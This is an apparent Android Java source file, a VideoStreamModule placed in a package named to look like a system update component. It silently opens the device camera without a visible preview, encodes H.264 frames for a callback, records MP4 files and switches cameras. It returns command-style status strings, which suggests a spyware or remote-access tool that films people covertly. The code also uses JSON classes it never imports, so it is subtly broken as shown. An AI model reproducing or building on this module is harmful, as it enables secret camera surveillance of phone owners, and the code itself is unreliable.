package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.*;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import androidx.core.app.ActivityCompat;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

public class VideoStreamModule {
    private static final String TAG = "VideoStreamModule";
    private static final int VIDEO_WIDTH = 640;
    private static final int VIDEO_HEIGHT = 480;
    private static final int VIDEO_FPS = 30;
    private static final int VIDEO_BITRATE = 500000; // 500 kbps
    private static final int MAX_QUEUE_SIZE = 10;
    
    private Context context;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private MediaCodec mediaCodec;
    private MediaMuxer mediaMuxer;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private HandlerThread encoderThread;
    private Handler encoderHandler;
    private Surface encoderSurface;
    private boolean isStreaming = false;
    private boolean isRecording = false;
    private String currentCameraId;
    private int videoTrackIndex = -1;
    private long presentationTimeUs;
    private VideoStreamCallback streamCallback;
    private BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(MAX_QUEUE_SIZE);
    private int frameCount = 0;
    private long startTime;
    private String currentVideoPath;
    
    public interface VideoStreamCallback {
        void onFrameData(byte[] frameData, int width, int height);
        void onStreamStarted();
        void onStreamStopped();
        void onError(String error);
        void onRecordingSaved(String path);
    }
    
    public VideoStreamModule(Context context) {
        Log.d(TAG, "🎥 VideoStreamModule constructor called");
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        startBackgroundThreads();
        findBestCamera();
    }
    
    private void startBackgroundThreads() {
        cameraThread = new HandlerThread("VideoCameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
        
        encoderThread = new HandlerThread("VideoEncoderThread");
        encoderThread.start();
        encoderHandler = new Handler(encoderThread.getLooper());
    }
    
    private void stopBackgroundThreads() {
        if (cameraThread != null) {
            cameraThread.quitSafely();
            try {
                cameraThread.join();
                cameraThread = null;
                cameraHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping camera thread", e);
            }
        }
        
        if (encoderThread != null) {
            encoderThread.quitSafely();
            try {
                encoderThread.join();
                encoderThread = null;
                encoderHandler = null;
            } catch (InterruptedException e) {
                Log.e(TAG, "Error stopping encoder thread", e);
            }
        }
    }
    
    private void findBestCamera() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "🎥 Available cameras: " + Arrays.toString(cameraIdList));
            
            // Prefer back camera for video
            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    currentCameraId = id;
                    Log.d(TAG, "🎥 Found back camera: " + id);
                    break;
                }
            }
            
            // If no back camera, use front
            if (currentCameraId == null && cameraIdList.length > 0) {
                currentCameraId = cameraIdList[0];
                Log.d(TAG, "🎥 Using first available camera: " + currentCameraId);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error finding camera", e);
        }
    }
    
    private boolean checkCameraPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    private boolean checkAudioPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                == PackageManager.PERMISSION_GRANTED;
    }
    
    public String startStreaming(VideoStreamCallback callback) {
        return startStreaming(VIDEO_WIDTH, VIDEO_HEIGHT, VIDEO_FPS, VIDEO_BITRATE, callback);
    }
    
    public String startStreaming(int width, int height, int fps, int bitrate, VideoStreamCallback callback) {
        Log.d(TAG, "🎥 startStreaming() called");
        
        if (!checkCameraPermission()) {
            return "ERROR: No camera permission";
        }
        
        if (isStreaming) {
            return "ERROR: Already streaming";
        }
        
        this.streamCallback = callback;
        this.presentationTimeUs = 0;
        this.frameCount = 0;
        
        try {
            // Initialize MediaCodec for encoding
            setupMediaCodec(width, height, bitrate, fps);
            
            // Open camera
            openCamera(width, height);
            
            isStreaming = true;
            startTime = System.currentTimeMillis();
            
            if (streamCallback != null) {
                streamCallback.onStreamStarted();
            }
            
            return "SUCCESS: Video streaming started";
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting video stream", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    private void setupMediaCodec(int width, int height, int bitrate, int fps) throws IOException {
        Log.d(TAG, "🎥 Setting up MediaCodec with " + width + "x" + height);
        
        // Create encoder for H.264
        String mimeType = MediaFormat.MIMETYPE_VIDEO_AVC;
        mediaCodec = MediaCodec.createEncoderByType(mimeType);
        
        MediaFormat mediaFormat = MediaFormat.createVideoFormat(mimeType, width, height);
        mediaFormat.setInteger(MediaFormat.KEY_BIT_RATE, bitrate);
        mediaFormat.setInteger(MediaFormat.KEY_FRAME_RATE, fps);
        mediaFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); // 1 second between keyframes
        mediaFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
        
        mediaCodec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
        
        // Get the input surface for camera
        encoderSurface = mediaCodec.createInputSurface();
        
        mediaCodec.start();
        Log.d(TAG, "🎥 MediaCodec configured and started");
    }
    
    private void openCamera(int width, int height) {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            
            // Find the best size
            Size[] sizes = configs.getOutputSizes(SurfaceTexture.class);
            Size selectedSize = new Size(width, height);
            
            // Try to find exact match, otherwise use closest
            for (Size size : sizes) {
                if (size.getWidth() == width && size.getHeight() == height) {
                    selectedSize = size;
                    break;
                }
            }
            
            Log.d(TAG, "🎥 Selected camera size: " + selectedSize.getWidth() + "x" + selectedSize.getHeight());
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    cameraDevice = device;
                    Log.d(TAG, "🎥 Camera opened");
                    
                    try {
                        // Create capture session with encoder surface
                        List<Surface> surfaces = new ArrayList<>();
                        surfaces.add(encoderSurface);
                        
                        device.createCaptureSession(surfaces, 
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    captureSession = session;
                                    Log.d(TAG, "🎥 Capture session configured");
                                    
                                    try {
                                        // Create repeating request for preview/stream
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD);
                                        builder.addTarget(encoderSurface);
                                        
                                        // Set auto-focus mode
                                        builder.set(CaptureRequest.CONTROL_AF_MODE, 
                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO);
                                        
                                        // Set auto-exposure mode
                                        builder.set(CaptureRequest.CONTROL_AE_MODE, 
                                            CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
                                        
                                        session.setRepeatingRequest(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(CameraCaptureSession session, 
                                                        CaptureRequest request, TotalCaptureResult result) {
                                                    // Frame captured
                                                }
                                            }, cameraHandler);
                                        
                                        // Start encoding loop
                                        startEncodingLoop();
                                        
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error creating capture request", e);
                                        if (streamCallback != null) {
                                            streamCallback.onError("Error starting preview: " + e.getMessage());
                                        }
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "🎥 Capture session configure failed");
                                    if (streamCallback != null) {
                                        streamCallback.onError("Failed to configure camera session");
                                    }
                                }
                            }, cameraHandler
                        );
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error creating capture session", e);
                        if (streamCallback != null) {
                            streamCallback.onError("Error creating capture session: " + e.getMessage());
                        }
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.w(TAG, "🎥 Camera disconnected");
                    if (streamCallback != null) {
                        streamCallback.onError("Camera disconnected");
                    }
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "🎥 Camera error: " + error);
                    if (streamCallback != null) {
                        streamCallback.onError("Camera error: " + error);
                    }
                }
            }, cameraHandler);
            
        } catch (Exception e) {
            Log.e(TAG, "Error opening camera", e);
            if (streamCallback != null) {
                streamCallback.onError("Error opening camera: " + e.getMessage());
            }
        }
    }
    
    private void startEncodingLoop() {
        encoderHandler.post(() -> {
            MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo();
            
            while (isStreaming && mediaCodec != null) {
                try {
                    int outputBufferId = mediaCodec.dequeueOutputBuffer(bufferInfo, 10000);
                    
                    if (outputBufferId >= 0) {
                        // Get the encoded frame
                        ByteBuffer outputBuffer = mediaCodec.getOutputBuffer(outputBufferId);
                        
                        if (outputBuffer != null && bufferInfo.size > 0) {
                            byte[] frameData = new byte[bufferInfo.size];
                            outputBuffer.get(frameData);
                            
                            // Send frame to callback
                            if (streamCallback != null && bufferInfo.flags != MediaCodec.BUFFER_FLAG_CODEC_CONFIG) {
                                frameCount++;
                                streamCallback.onFrameData(frameData, VIDEO_WIDTH, VIDEO_HEIGHT);
                                
                                // Log every 30 frames
                                if (frameCount % 30 == 0) {
                                    long elapsed = System.currentTimeMillis() - startTime;
                                    float fps = (frameCount * 1000f) / elapsed;
                                    Log.d(TAG, "🎥 Streaming at " + String.format("%.2f", fps) + " fps");
                                }
                            }
                            
                            // If recording, write to file
                            if (isRecording && mediaMuxer != null && videoTrackIndex != -1) {
                                bufferInfo.presentationTimeUs = presentationTimeUs;
                                mediaMuxer.writeSampleData(videoTrackIndex, outputBuffer, bufferInfo);
                                presentationTimeUs += 1000000 / VIDEO_FPS; // 33ms for 30fps
                            }
                        }
                        
                        mediaCodec.releaseOutputBuffer(outputBufferId, false);
                    }
                    
                } catch (IllegalStateException e) {
                    Log.e(TAG, "Error in encoding loop", e);
                    break;
                }
            }
            
            Log.d(TAG, "🎥 Encoding loop ended");
        });
    }
    
    public String stopStreaming() {
        Log.d(TAG, "🎥 stopStreaming() called");
        
        isStreaming = false;
        
        // Close camera session
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        
        // Close camera
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        
        // Stop and release encoder
        if (mediaCodec != null) {
            try {
                mediaCodec.stop();
                mediaCodec.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing codec", e);
            }
            mediaCodec = null;
        }
        
        // Stop recording if active
        if (isRecording) {
            stopRecording();
        }
        
        if (streamCallback != null) {
            streamCallback.onStreamStopped();
        }
        
        return "SUCCESS: Video streaming stopped";
    }
    
    public String startRecording(String filename) {
        Log.d(TAG, "🎥 startRecording() called: " + filename);
        
        if (!isStreaming) {
            return "ERROR: Not streaming";
        }
        
        if (isRecording) {
            return "ERROR: Already recording";
        }
        
        try {
            // Create output file
            java.io.File videoFile = new java.io.File(context.getExternalFilesDir(null), filename);
            currentVideoPath = videoFile.getAbsolutePath();
            
            // Initialize MediaMuxer for MP4 output
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                mediaMuxer = new MediaMuxer(currentVideoPath, MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4);
                
                // Add video track
                MediaFormat videoFormat = MediaFormat.createVideoFormat(
                    MediaFormat.MIMETYPE_VIDEO_AVC, VIDEO_WIDTH, VIDEO_HEIGHT);
                videoTrackIndex = mediaMuxer.addTrack(videoFormat);
                
                mediaMuxer.start();
                presentationTimeUs = 0;
                isRecording = true;
                
                Log.d(TAG, "🎥 Recording started: " + currentVideoPath);
                return "SUCCESS: Recording started|" + currentVideoPath;
            } else {
                return "ERROR: MediaMuxer not supported on this Android version";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting recording", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String stopRecording() {
        Log.d(TAG, "🎥 stopRecording() called");
        
        if (!isRecording) {
            return "ERROR: Not recording";
        }
        
        isRecording = false;
        
        if (mediaMuxer != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            try {
                mediaMuxer.stop();
                mediaMuxer.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping muxer", e);
            }
            mediaMuxer = null;
        }
        
        String result = "SUCCESS: Recording saved|" + currentVideoPath;
        
        if (streamCallback != null) {
            streamCallback.onRecordingSaved(currentVideoPath);
        }
        
        return result;
    }
    
    public String switchCamera() {
        Log.d(TAG, "🎥 switchCamera() called");
        
        String[] cameraIds;
        try {
            cameraIds = cameraManager.getCameraIdList();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
        
        // Find next camera
        String nextCameraId = null;
        for (int i = 0; i < cameraIds.length; i++) {
            if (cameraIds[i].equals(currentCameraId)) {
                nextCameraId = cameraIds[(i + 1) % cameraIds.length];
                break;
            }
        }
        
        if (nextCameraId == null) {
            nextCameraId = cameraIds[0];
        }
        
        // Check if we need to restart streaming
        boolean wasStreaming = isStreaming;
        
        if (wasStreaming) {
            stopStreaming();
        }
        
        currentCameraId = nextCameraId;
        
        if (wasStreaming) {
            // Restart streaming with new camera
            startStreaming(streamCallback);
        }
        
        return "SUCCESS: Switched to camera " + currentCameraId;
    }
    
    public String getStatus() {
        try {
            StringBuilder status = new StringBuilder();
            status.append("Streaming: ").append(isStreaming).append("\n");
            status.append("Recording: ").append(isRecording).append("\n");
            status.append("Camera: ").append(currentCameraId).append("\n");
            status.append("Resolution: ").append(VIDEO_WIDTH).append("x").append(VIDEO_HEIGHT).append("\n");
            status.append("FPS: ").append(VIDEO_FPS).append("\n");
            status.append("Bitrate: ").append(VIDEO_BITRATE / 1000).append(" kbps\n");
            
            if (isStreaming) {
                long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                status.append("Duration: ").append(elapsed).append("s\n");
                status.append("Frames: ").append(frameCount).append("\n");
                float fps = (frameCount * 1000f) / (System.currentTimeMillis() - startTime);
                status.append("Actual FPS: ").append(String.format("%.2f", fps)).append("\n");
            }
            
            return "SUCCESS: " + status.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting status", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String getAvailableResolutions() {
        try {
            JSONArray resolutions = new JSONArray();
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            
            if (configs != null) {
                Size[] sizes = configs.getOutputSizes(SurfaceTexture.class);
                for (Size size : sizes) {
                    JSONObject res = new JSONObject();
                    res.put("width", size.getWidth());
                    res.put("height", size.getHeight());
                    resolutions.put(res);
                }
            }
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("resolutions", resolutions);
            result.put("current_camera", currentCameraId);
            
            return result.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting resolutions", e);
            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    public void cleanup() {
        Log.d(TAG, "🧹 Cleaning up VideoStreamModule");
        
        if (isStreaming) {
            stopStreaming();
        }
        
        stopBackgroundThreads();
    }
}
